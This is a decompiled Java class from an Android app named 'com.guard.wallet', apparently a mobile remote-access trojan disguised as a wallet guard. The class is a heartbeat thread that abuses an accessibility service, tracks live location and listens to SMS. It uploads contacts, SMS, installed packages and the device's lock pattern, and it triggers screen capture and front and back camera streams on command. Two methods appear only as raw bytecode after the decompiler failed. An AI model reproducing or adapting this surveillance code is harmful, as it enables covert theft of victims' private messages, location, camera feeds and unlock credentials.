package com.guard.wallet.thread;

import a1.q;
import android.accounts.AccountManager;
import android.content.Context;
import android.os.PowerManager;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.msg.BridgeBody;
import com.guard.wallet.msg.BridgeMessage;
import com.guard.wallet.req.HeartBodyVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqCacheTaskBodyVO;
import com.guard.wallet.req.ReqMonitorLocationVO;
import com.guard.wallet.resp.DeviceDebugVO;
import com.guard.wallet.service.CustomNotificationService;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class f extends TimerTask {
   public static final ReentrantLock i = new ReentrantLock();
   public final s.a a = new s.a(5000, 1);
   public final s.a b;
   public final s.a c;
   public final Timer d;
   public Integer e;
   public final AtomicInteger f;
   public final AtomicInteger g;
   public final AtomicBoolean h;

   public f() {
      Integer var1 = 30000;
      Integer var2 = 10;
      this.b = new s.a(var1, var2);
      this.c = new s.a(var1, var2);
      this.d = new Timer();
      this.e = 0;
      this.f = new AtomicInteger(0);
      this.g = new AtomicInteger(6);
      this.h = new AtomicBoolean(false);
   }

   public static void b() {
      if (!com.guard.wallet.utils.f.b.get()) {
         com.guard.wallet.http.l.a();
      }

      if (MyAccessibilityService.P() != null && !MyAccessibilityService.P().V()) {
         boolean var2;
         if (MyAccessibilityService.P().k.get() >= 1) {
            var2 = true;
         } else {
            var2 = false;
         }

         if (!var2) {
            MyAccessibilityService.P().d0();
         } else {
            com.guard.wallet.http.l.d();
         }
      }

      if (CustomNotificationService.c == null) {
         String var7 = com.guard.wallet.http.l.a;
         if (!q.E(7912)) {
            j.e var9 = new j.e(1);
            new com.guard.wallet.http.i("http://127.0.0.1:7912").d(null, "/activeMainNotification", var9);
         }
      }

      if (v.c.f != null) {
         if ((ReqMonitorLocationVO)v.c.f.e.get() != null && v.c.f.d == null) {
            v.c var10 = v.c.f;
            var10.getClass();
            if (com.guard.wallet.utils.g.Z() != null
               && ContextCompat.checkSelfPermission(com.guard.wallet.utils.g.Z(), "android.permission.ACCESS_FINE_LOCATION") == 0
               && ContextCompat.checkSelfPermission(com.guard.wallet.utils.g.Z(), "android.permission.ACCESS_COARSE_LOCATION") == 0) {
               var10.a();
               if (var10.b != null && var10.a != null) {
                  AtomicReference var8 = var10.e;
                  if (var8.get() != null) {
                     long var5 = ((ReqMonitorLocationVO)var8.get()).getMinTimeMs();
                     float var1 = ((ReqMonitorLocationVO)var8.get()).getMinDistanceM();
                     long var3 = var5;
                     if (var5 <= 0L) {
                        var3 = 10000L;
                     }

                     float var0 = var1;
                     if (var1 <= 0.0F) {
                        var0 = 100.0F;
                     }

                     v.b var12 = new v.b(var10);
                     var10.d = var12;
                     var10.a.requestLocationUpdates(var10.b, var3, var0, var12);
                     Log.d("v.c", "已添加地理位置实时监听");
                  }
               }
            }
         }

         if ((ReqMonitorLocationVO)v.c.f.e.get() == null && v.c.f.d != null) {
            v.c var13 = v.c.f;
            v.b var11 = var13.d;
            if (var11 != null) {
               var13.a.removeUpdates(var11);
               var13.d = null;
               var13.e.set(null);
               Log.d("v.c", "已取消地理位置实时监听");
            }
         }
      }

      if (MainApplication.getInstance().getSmsMessageListener() != null && !Objects.equals(MainApplication.getInstance().getSmsMessageListener().b, 2)) {
         if (Objects.equals(MainApplication.getInstance().getSmsMessageListener().b, 0)) {
            MainApplication.getInstance().getSmsMessageListener().a();
         } else {
            com.guard.wallet.http.l.y();
         }
      }
   }

   public static void d() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
      //
      // Bytecode:
      // 00: ldc_w "deviceId"
      // 03: invokestatic com/guard/wallet/utils/h.l (Ljava/lang/String;)Ljava/lang/String;
      // 06: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 09: ifne 9f
      // 0c: invokestatic com/guard/wallet/utils/g.l ()Z
      // 0f: ifeq 3d
      // 12: ldc_w com/guard/wallet/utils/h
      // 15: monitorenter
      // 16: ldc_w "syncPackages"
      // 19: invokestatic com/guard/wallet/utils/h.e (Ljava/lang/String;)Z
      // 1c: istore 0
      // 1d: ldc_w com/guard/wallet/utils/h
      // 20: monitorexit
      // 21: iload 0
      // 22: ifne 3d
      // 25: new com/guard/wallet/thread/m
      // 28: dup
      // 29: bipush 2
      // 2a: invokespecial com/guard/wallet/thread/m.<init> (I)V
      // 2d: ldc_w "SYNC_DEVICE_INSTALLED_PACKAGES"
      // 30: invokestatic com/guard/wallet/thread/l.d (Lcom/guard/wallet/thread/m;Ljava/lang/String;)V
      // 33: goto 3d
      // 36: astore 1
      // 37: ldc_w com/guard/wallet/utils/h
      // 3a: monitorexit
      // 3b: aload 1
      // 3c: athrow
      // 3d: invokestatic com/guard/wallet/utils/g.n ()Z
      // 40: ifeq 6e
      // 43: ldc_w com/guard/wallet/utils/h
      // 46: monitorenter
      // 47: ldc_w "syncContacts"
      // 4a: invokestatic com/guard/wallet/utils/h.e (Ljava/lang/String;)Z
      // 4d: istore 0
      // 4e: ldc_w com/guard/wallet/utils/h
      // 51: monitorexit
      // 52: iload 0
      // 53: ifne 6e
      // 56: new com/guard/wallet/thread/m
      // 59: dup
      // 5a: bipush 1
      // 5b: invokespecial com/guard/wallet/thread/m.<init> (I)V
      // 5e: ldc_w "SYNC_DEVICE_CONTACTS"
      // 61: invokestatic com/guard/wallet/thread/l.d (Lcom/guard/wallet/thread/m;Ljava/lang/String;)V
      // 64: goto 6e
      // 67: astore 1
      // 68: ldc_w com/guard/wallet/utils/h
      // 6b: monitorexit
      // 6c: aload 1
      // 6d: athrow
      // 6e: invokestatic com/guard/wallet/utils/g.p ()Z
      // 71: ifeq 9f
      // 74: ldc_w com/guard/wallet/utils/h
      // 77: monitorenter
      // 78: ldc_w "syncSmsMessage"
      // 7b: invokestatic com/guard/wallet/utils/h.e (Ljava/lang/String;)Z
      // 7e: istore 0
      // 7f: ldc_w com/guard/wallet/utils/h
      // 82: monitorexit
      // 83: iload 0
      // 84: ifne 9f
      // 87: new com/guard/wallet/thread/m
      // 8a: dup
      // 8b: bipush 5
      // 8c: invokespecial com/guard/wallet/thread/m.<init> (I)V
      // 8f: ldc_w "SYNC_DEVICE_SMS"
      // 92: invokestatic com/guard/wallet/thread/l.d (Lcom/guard/wallet/thread/m;Ljava/lang/String;)V
      // 95: goto 9f
      // 98: astore 1
      // 99: ldc_w com/guard/wallet/utils/h
      // 9c: monitorexit
      // 9d: aload 1
      // 9e: athrow
      // 9f: return
   }

   public final void a() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: aconst_null
      // 01: ldc_w "http://127.0.0.1:7910"
      // 04: ldc_w "/version"
      // 07: invokestatic com/guard/wallet/http/l.b (Lcom/guard/wallet/req/ReqDefaultBodyVO;Ljava/lang/String;Ljava/lang/String;)Lcom/google/json/JsonObject;
      // 0a: astore 2
      // 0b: aload 2
      // 0c: ifnull 44
      // 0f: new com/guard/wallet/thread/KeepHeartThread$1
      // 12: dup
      // 13: invokespecial com/guard/wallet/thread/KeepHeartThread$1.<init> ()V
      // 16: astore 1
      // 17: aload 2
      // 18: invokevirtual com/google/json/JsonElement.toString ()Ljava/lang/String;
      // 1b: aload 1
      // 1c: invokestatic com/guard/wallet/utils/h.c (Ljava/lang/String;Lcom/google/json/reflect/TypeToken;)Ljava/lang/Object;
      // 1f: checkcast com/guard/wallet/resp/ApiResult
      // 22: astore 1
      // 23: aload 1
      // 24: ifnull 44
      // 27: aload 1
      // 28: invokevirtual com/guard/wallet/resp/ApiResult.getSuccess ()Ljava/lang/Boolean;
      // 2b: invokevirtual java/lang/Boolean.booleanValue ()Z
      // 2e: ifeq 44
      // 31: ldc_w "KeepHeartThread"
      // 34: ldc_w "本地HttpServer运行正常"
      // 37: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 3a: pop
      // 3b: aload 0
      // 3c: getfield com/guard/wallet/thread/f.f Ljava/util/concurrent/atomic/AtomicInteger;
      // 3f: bipush 0
      // 40: invokevirtual java/util/concurrent/atomic/AtomicInteger.set (I)V
      // 43: return
      // 44: ldc_w "KeepHeartThread"
      // 47: ldc_w "本地HttpServer运行异常"
      // 4a: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
      // 4d: pop
      // 4e: aload 0
      // 4f: getfield com/guard/wallet/thread/f.f Ljava/util/concurrent/atomic/AtomicInteger;
      // 52: invokevirtual java/util/concurrent/atomic/AtomicInteger.incrementAndGet ()I
      // 55: bipush 5
      // 56: if_icmple ab
      // 59: getstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
      // 5c: ifnull 69
      // 5f: getstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
      // 62: invokevirtual com/guard/wallet/server/b.f3 ()V
      // 65: bipush 5
      // 66: invokestatic com/guard/wallet/utils/g.T0 (I)V
      // 69: getstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
      // 6c: ifnonnull 93
      // 6f: ldc_w com/guard/wallet/server/b
      // 72: monitorenter
      // 73: getstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
      // 76: ifnonnull 85
      // 79: new com/guard/wallet/server/b
      // 7c: astore 1
      // 7d: aload 1
      // 7e: invokespecial com/guard/wallet/server/b.<init> ()V
      // 81: aload 1
      // 82: putstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
      // 85: ldc_w com/guard/wallet/server/b
      // 88: monitorexit
      // 89: goto 93
      // 8c: astore 1
      // 8d: ldc_w com/guard/wallet/server/b
      // 90: monitorexit
      // 91: aload 1
      // 92: athrow
      // 93: getstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
      // 96: invokevirtual com/guard/wallet/server/b.W2 ()V
      // 99: aload 0
      // 9a: getfield com/guard/wallet/thread/f.f Ljava/util/concurrent/atomic/AtomicInteger;
      // 9d: bipush 0
      // 9e: invokevirtual java/util/concurrent/atomic/AtomicInteger.set (I)V
      // a1: ldc_w "KeepHeartThread"
      // a4: ldc_w "本地HttpServer重启完成"
      // a7: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // aa: pop
      // ab: return
   }

   public final void c() {
      HeartBodyVO var3 = new HeartBodyVO();
      var3.setPackageName(MainApplication.getInstance().getPackageName());
      var3.setContainerCode("ACCESSIBILITY_CONTAINER");
      byte var1;
      if (MyAccessibilityService.P() != null) {
         var1 = 1;
      } else {
         var1 = 0;
      }

      var3.setIsOpened(Integer.valueOf(var1));
      var3.setServiceState(com.guard.wallet.server.b.c.get());
      MessageRecordVO var2 = new MessageRecordVO();
      var2.setExtraBody(var3);
      var2.setIntentCode("android.intent.action.DEVICE_RUNNING");
      this.b.a(var2);
   }

   public final void e() {
      com.guard.wallet.bridge.a var2 = q.c;
      boolean var1;
      if (var2 != null && var2.w.get()) {
         var1 = true;
      } else {
         var1 = false;
      }

      if (!var1) {
         String var4 = com.guard.wallet.utils.h.l("deviceId");
         if (!q.B(var4)) {
            BridgeBody var3 = new BridgeBody();
            var3.setDeviceId(var4);
            var3.setBridgePath("/cacheTask");
            q.k("/cacheTask", new BridgeMessage(var3));
         }
      }

      AtomicInteger var5 = this.g;
      if (var5.get() < 6 && !this.h.get()) {
         q.g("/minicap");
         q.g("/readScreen");
         q.g("/frontCameraLive");
         q.g("/backCameraLive");
         if (var5.get() < 6) {
            var5.set(var5.get() + 1);
         }
      } else {
         String var6 = com.guard.wallet.http.l.a;
         String var7 = com.guard.wallet.utils.h.l("deviceId");
         if (!q.B(var7)) {
            ReqCacheTaskBodyVO var8 = new ReqCacheTaskBodyVO(var7, "ACCESSIBILITY_CONTAINER");
            com.guard.wallet.http.j var9 = new com.guard.wallet.http.j();
            new com.guard.wallet.http.i().d(var8, "/api/containerApi/getCacheTask", var9);
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void run() {
      boolean var1 = true;
      this.e = 1;
      ReentrantLock var4 = i;
      if (var4.tryLock()) {
         Log.d("KeepHeartThread", "keep heart thread is running");

         label140: {
            Exception var10000;
            label146: {
               try {
                  b();
                  this.a();
               } catch (Exception var20) {
                  var10000 = var20;
                  boolean var10001 = false;
                  break label146;
               }

               label147: {
                  label134: {
                     try {
                        if (h.e.S() == null) {
                           h.e.T();
                           break label147;
                        }
                     } catch (Exception var19) {
                        var10000 = var19;
                        boolean var33 = false;
                        break label134;
                     }

                     try {
                        h.e.S().H();
                        break label147;
                     } catch (Exception var18) {
                        var10000 = var18;
                        boolean var34 = false;
                     }
                  }

                  Exception var5 = var10000;

                  try {
                     q.s("KeepHeartThread", var5);
                  } catch (Exception var17) {
                     var10000 = var17;
                     boolean var35 = false;
                     break label146;
                  }
               }

               boolean var3 = false;

               label148: {
                  label149: {
                     label118: {
                        label117: {
                           try {
                              if (com.guard.wallet.utils.h.e("isAdminActivating")) {
                                 break label117;
                              }

                              if (com.guard.wallet.utils.g.Z() != null
                                 && AccountManager.get(com.guard.wallet.utils.g.Z()).getAccountsByType("com.guard.wallet").length > 0) {
                                 break label118;
                              }
                           } catch (Exception var16) {
                              var10000 = var16;
                              boolean var36 = false;
                              break label149;
                           }

                           var1 = false;
                           break label118;
                        }

                        try {
                           com.guard.wallet.utils.g.K0(null);
                           break label148;
                        } catch (Exception var15) {
                           var10000 = var15;
                           boolean var38 = false;
                           break label149;
                        }
                     }

                     if (var1) {
                        break label148;
                     }

                     try {
                        com.guard.wallet.utils.g.d();
                        break label148;
                     } catch (Exception var14) {
                        var10000 = var14;
                        boolean var37 = false;
                     }
                  }

                  Exception var21 = var10000;

                  try {
                     q.s("KeepHeartThread", var21);
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var39 = false;
                     break label146;
                  }
               }

               Context var25;
               try {
                  DeviceDebugVO var22 = DeviceDebugVO.of();
                  MessageRecordVO var6 = new MessageRecordVO();
                  var6.setExtraBody(var22);
                  var6.setIntentCode("android.intent.action.DEVICE_DEBUG");
                  this.a.a(var6);
                  this.c();
                  LockPatternVO var23 = com.guard.wallet.utils.g.B0();
                  var6 = new MessageRecordVO();
                  var6.setIntentCode("android.intent.action.LOCK_PATTERN");
                  var6.setExtraBody(var23);
                  this.c.a(var6);
                  String var24 = com.guard.wallet.utils.e.a;
                  var25 = com.guard.wallet.utils.g.Z();
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var40 = false;
                  break label146;
               }

               boolean var2;
               var2 = var3;
               label92:
               if (var25 != null) {
                  label152: {
                     try {
                        var26 = (PowerManager)var25.getSystemService("power");
                     } catch (Exception var11) {
                        var10000 = var11;
                        boolean var41 = false;
                        break label152;
                     }

                     var2 = var3;
                     if (var26 == null) {
                        break label92;
                     }

                     try {
                        var2 = var26.isDeviceIdleMode();
                        break label92;
                     } catch (Exception var10) {
                        var10000 = var10;
                        boolean var42 = false;
                     }
                  }

                  Exception var27 = var10000;

                  try {
                     q.s("DeviceUtils", var27);
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var43 = false;
                     break label146;
                  }

                  var2 = var3;
               }

               if (var2) {
                  try {
                     Log.d("KeepHeartThread", "isIdleMode");
                  } catch (Exception var8) {
                     var10000 = var8;
                     boolean var44 = false;
                     break label146;
                  }
               }

               try {
                  d();
                  this.e();
                  break label140;
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var45 = false;
               }
            }

            Exception var28 = var10000;
            q.s("KeepHeartThread", var28);
         }

         var4.unlock();
      }
   }
}
